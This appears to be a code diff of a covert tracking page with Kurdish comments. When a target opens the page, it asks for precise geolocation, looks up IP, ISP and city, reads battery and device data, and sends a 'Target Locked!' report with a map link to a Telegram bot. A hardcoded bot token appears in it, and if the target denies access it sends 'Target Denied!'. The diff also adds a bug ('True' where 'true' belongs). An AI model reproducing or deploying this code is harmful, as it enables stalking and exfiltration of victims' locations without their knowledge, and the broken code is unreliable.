@@ -1,12 +1,3 @@
-<!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <title> </title>
-    <style>body { background: white; margin: 0; overflow: hidden; }</style>
-</head>
-<body onload="capture()">
-
 <script>
     const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
@@ -15,47 +6,49 @@
         const uid = params.get('id');
         if (!uid) return;
 
-        // ١. داواکردنی لۆکەیشن (پەنجەرەی Allow لێرە دەردەکەوێت)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // ٢. کۆکردنەوەی زانیارییەکان بە خێرایی
-            let ip = "N/A", isp = "Korek Telecom", city = "Erbil/Bakhtiari";
+            // وەرگرتنی کات بە فۆرماتی کوردی/عێراقی
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: True });
+
+            // وەرگرتنی زانیاری شار و ئایپی لە سێرڤەرێکی جێگیرتر
+            let ip = "N/A", isp = "Korek", city = "Erbil";
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('https://ipwho.is/');
                 const data = await res.json();
                 ip = data.ip;
-                isp = data.org;
-                city = data.city + "/" + (data.region || "");
-            } catch(e) {}
+                isp = data.connection.isp;
+                city = data.city + " / " + data.region;
+            } catch(e) {
+                // ئەگەر ئەو سێرڤەرە کاری نەکرد، سێرڤەری دووەم تاقی دەکاتەوە
+                const res2 = await fetch('https://api.ipify.org?format=json');
+                const data2 = await res2.json();
+                ip = data2.ip;
+            }
 
-            let bat = "N/A", ch = "No";
+            let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
-                ch = b.charging ? "Yes" : "No";
             }
 
-            const time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
-
-            // ٣. ڕێکخستنی نامەکە ڕێک بەو شێوەیەی داوات کردووە
-            let report = `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
+            // فۆرماتە ڕێکەکەی خۆت
+            let report = `🚨 <b>Target Locked!</b>\n\n` +
+                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
                          `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                         `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
-                         `🕒 <b>Time:</b> <code>${time}</code>\n` +
+                         `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
+                         `🕒 <b>Time:</b> <code>${timeStr}</code>\n` +
                          `🏙️ <b>City:</b> <code>${city}</code>`;
 
-            // ٤. ناردنی خێرا بەبێ پچڕان (sendBeacon)
             const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
             navigator.sendBeacon(url);
 
         }, (err) => {
-            // ئەگەر Allow نەکرد
             navigator.sendBeacon(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`);
         }, { enableHighAccuracy: true });
     }
 </script>
-</body>
-</html>
